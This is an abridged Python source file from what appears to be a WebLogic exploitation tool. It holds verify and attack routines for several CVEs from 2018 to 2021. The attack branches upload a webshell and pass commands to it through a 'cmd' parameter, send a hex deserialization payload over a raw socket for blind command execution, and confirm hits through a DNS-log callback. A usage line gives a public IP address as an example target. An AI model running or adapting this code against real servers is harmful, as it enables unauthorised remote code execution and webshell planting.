...
#        self.payload_cve_2020_2555 = '%s%s' % ('{:08x}'.format(len(self.payload_cve_2020_2555) // 2 + 4), self.payload_cve_2020_2555)
    ...
    def cve_2018_2894(self):
        ...
        try:
            ...
            #_attack
                ...
                request = exprequest.get(shellpath, headers=self.headers)
                request = exprequest.get(shellpath+"?pwd=password&cmd="+self.cmd, headers=self.headers, verify=False)
                r = "Upload Webshell: "+shellpath+"\n-------------------------\n"
                print(r)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def cve_2019_2729(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url+path, data=self.payload_cve_2019_2729, headers=headers, verify=False)
                if self.flag in request.text:
    ...
    def cve_2020_2555(self):
        ...
        try:
            ...
            #_attack
                ...
                time.sleep(1)
                sock.send(bytes.fromhex(payload))
                r = "Command Executed Successfully (No Echo)"
                return output.no_echo_success(method, r)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def cve_2020_14882(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url + path, data=payload, headers=headers, verify=False)
                if self.flag in request.text:
                    return output.echo_success(method, appName)
                else:
                    return output.fail()
    ...
    def cve_2020_14883(self):
        ...
        try:
            ...
            if self.vuln == 'False':
                ...
                request = exprequest.get(self.url + path, headers=headers, verify=False)            
                if dnslog.result():
                    return output.no_echo_success(method, info)
    ...
    def cve_2021_2109(self):
        ...
        try:
            if self.vuln == 'False':
                dnslog = Dnslog()
                r = exprequest.post(self.url+path, data=data.format(dnslog.dns_host()), headers=headers)
                if dnslog.result():
...
print("""eg: http://119.3.36.68:7001/
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
